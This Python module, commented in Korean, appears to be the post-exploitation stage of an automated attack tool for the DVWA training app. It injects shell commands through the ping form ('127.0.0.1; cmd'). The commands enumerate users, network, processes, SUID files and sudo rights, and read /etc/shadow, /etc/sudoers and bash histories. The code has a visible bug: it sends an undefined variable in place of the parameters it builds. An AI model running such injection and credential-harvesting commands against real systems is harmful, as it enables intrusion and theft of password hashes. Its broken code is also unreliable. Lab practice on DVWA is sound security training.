"""
Post-Exploitation Module
내부 침투 및 권한 상승 모듈
"""

import time
import re
from utils.logger import log_attack, log_command_output

# Post-exploitation 명령어 목록
POST_EXPLOIT_COMMANDS = {
    'system_info': [
        'uname -a',
        'cat /etc/os-release',
        'cat /proc/version',
        'hostname',
    ],
    'user_enum': [
        'whoami',
        'id',
        'cat /etc/passwd',
        'cat /etc/group',
        'w',
        'last',
    ],
    'network_enum': [
        'ifconfig -a',
        'ip addr',
        'netstat -antup',
        'ss -tulpn',
        'arp -a',
        'route -n',
    ],
    'process_enum': [
        'ps aux',
        'ps -ef',
        'top -n 1',
    ],
    'file_search': [
        'find / -perm -4000 2>/dev/null',  # SUID 파일
        'find / -writable -type f 2>/dev/null',  # 쓰기 가능 파일
        'find /home -type f -name "*.txt" 2>/dev/null',
        'find /var/www -type f -name "*.conf" 2>/dev/null',
        'ls -la /home',
        'ls -la /root',
    ],
    'privilege_check': [
        'sudo -l',
        'cat /etc/sudoers',
        'getcap -r / 2>/dev/null',
    ],
    'sensitive_files': [
        'cat /etc/shadow',
        'cat /root/.bash_history',
        'cat /home/*/.bash_history',
        'cat /var/www/html/config.php',
        'find / -name "*.conf" 2>/dev/null | head -20',
    ],
}

def run_attack(session, delay=1):
    """
    Post-Exploitation 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간(초)

    Returns:
        dict: 공격 결과 통계
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': {}
    }

    print("  [*] Post-Exploitation 단계 시작")
    print("  [*] 주의: 이 단계는 command injection 취약점을 통해 실행됩니다.\n")

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    for category, commands in POST_EXPLOIT_COMMANDS.items():
        print(f"  [*] {category} 수집 중...")
        category_results = []

        for cmd in commands:
            results['attempts'] += 1

            try:
                # Command Injection을 통한 명령어 실행
                payload = f"127.0.0.1; {cmd}"
                params = {
                    'ip': payload,
                    'Submit': 'Submit'
                }

                response = session.session.post(cmdi_url, data=data)

                # HTML에서 실제 명령어 출력 추출
                command_output = extract_command_output(response.text)

                # 명령어 실행 여부 확인 (응답에 ping 외의 내용이 있는지)
                if command_output and is_command_output_present(response.text, cmd):
                    results['successful'] += 1
                    category_results.append({
                        'command': cmd,
                        'output_length': len(command_output)
                    })

                    # 실제 명령어 출력을 상세 로그에 기록
                    log_command_output(cmd, category, command_output, preview_lines=30)

                    log_attack(
                        'POST_EXPLOIT',
                        'SUCCESS',
                        f"Category: {category}, Command: {cmd}",
                        response.status_code,
                        len(response.text)
                    )
                    print(f"    [+] 성공: {cmd} ({len(command_output)} bytes)")
                else:
                    log_attack(
                        'POST_EXPLOIT',
                        'FAILED',
                        f"Category: {category}, Command: {cmd}",
                        response.status_code,
                        len(response.text)
                    )

                time.sleep(delay)

            except Exception as e:
                log_attack(
                    'POST_EXPLOIT',
                    'ERROR',
                    f"Command: {cmd}, Error: {str(e)}",
                    0,
                    0
                )
                print(f"    [-] 오류: {cmd} - {str(e)}")

        if category_results:
            results['findings'][category] = category_results
            results['success'] = True

    print(f"\n[*] Post-Exploitation 완료: {results['successful']}/{results['attempts']} 성공")
    print_post_exploit_summary(results['findings'])

    return results

def is_command_output_present(response_text, command):
    """
    명령어 실행 결과가 응답에 포함되어 있는지 확인

    Args:
        response_text: HTTP 응답 본문
        command: 실행한 명령어

    Returns:
        bool: 명령어 실행 결과 포함 여부
    """
    # DVWA ping 기본 출력과 다른 내용이 있는지 확인
    if len(response_text) < 500:  # ping 결과만 있을 경우 짧음
        return False

    # 명령어별 예상 출력 패턴
    output_patterns = {
        'uname': ['Linux', 'GNU'],
        'whoami': ['www-data', 'root', 'apache'],
        'id': ['uid=', 'gid='],
        'passwd': ['root:x:', '/bin/bash'],
        'ifconfig': ['inet', 'netmask'],
        'netstat': ['tcp', 'LISTEN'],
        'ps': ['PID', 'CMD'],
        'find': ['/', 'permission denied'],
        'sudo': ['User', 'may run'],
        'bash_history': ['cd ', 'ls ', 'cat '],
    }

    # 명령어에 해당하는 패턴 찾기
    for key, patterns in output_patterns.items():
        if key in command.lower():
            for pattern in patterns:
                if pattern.lower() in response_text.lower():
                    return True

    # 일반적인 명령어 출력 패턴
    general_patterns = ['root:', 'uid=', 'inet ', '/bin/', '/usr/', '/var/']
    for pattern in general_patterns:
        if pattern in response_text:
            return True

    return False

def extract_command_output(html_response):
    """
    HTML 응답에서 실제 명령어 출력 추출

    Args:
        html_response: HTTP 응답 본문

    Returns:
        str: 추출된 명령어 출력
    """
    try:
        # 방법 1: <pre> 태그에서 추출
        pre_match = re.search(r'<pre>(.*?)</pre>', html_response, re.DOTALL | re.IGNORECASE)
        if pre_match:
            output = pre_match.group(1)
        else:
            # 방법 2: textarea에서 추출
            textarea_match = re.search(r'<textarea[^>]*>(.*?)</textarea>', html_response, re.DOTALL | re.IGNORECASE)
            if textarea_match:
                output = textarea_match.group(1)
            else:
                # 방법 3: DVWA의 vulnerability 컨테이너 영역에서 추출
                container_match = re.search(r'class=["\']vulnerability[^>]*>(.*?)</div>', html_response, re.DOTALL | re.IGNORECASE)
                if container_match:
                    # HTML 태그 제거
                    output = re.sub(r'<[^>]+>', '', container_match.group(1))
                else:
                    return ""

        # HTML 엔티티 디코딩
        output = output.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
        output = output.replace('&quot;', '"').replace('&#039;', "'")

        # ping 결과 제거 (127.0.0.1 관련 내용)
        lines = output.split('\n')
        filtered_lines = []
        skip_ping = False
        ping_end_marker = 0

        for i, line in enumerate(lines):
            # ping 명령어 시작 감지
            if 'PING 127.0.0.1' in line:
                skip_ping = True
                continue

            # ping 통계 부분 감지
            if skip_ping and ('ping statistics' in line.lower() or 'packets transmitted' in line.lower()):
                # 다음 2-3줄도 ping 결과이므로 스킵
                ping_end_marker = i + 3
                continue

            # ping 결과 종료 후부터 실제 명령어 출력
            if i > ping_end_marker and skip_ping:
                skip_ping = False

            # ping 관련 출력 건너뛰기
            if skip_ping or i <= ping_end_marker:
                continue

            # 빈 줄이 아니고 실제 내용이 있으면 추가
            if line.strip():
                filtered_lines.append(line)

        result = '\n'.join(filtered_lines)

        # 디버깅: 추출된 내용이 너무 짧으면 원본 일부를 반환
        if len(result.strip()) < 10 and len(output) > 100:
            # ping 부분 이후의 모든 내용 반환
            ping_end = output.find('packets transmitted')
            if ping_end > 0:
                # ping 통계 이후 200자 찾기
                remaining = output[ping_end:].split('\n', 4)
                if len(remaining) > 3:
                    result = '\n'.join(remaining[3:])
            else:
                # ping이 없으면 전체 반환
                result = output

        return result.strip()
    except Exception as e:
        # 디버깅을 위해 에러 출력
        print(f"[DEBUG] extract_command_output error: {str(e)}")
        return ""

def print_post_exploit_summary(findings):
    """
    Post-Exploitation 결과 요약 출력

    Args:
        findings: 수집된 정보
    """
    if not findings:
        return

    print("\n  [*] 수집된 정보 요약:")
    for category, results in findings.items():
        print(f"    - {category}: {len(results)}개 명령어 성공")
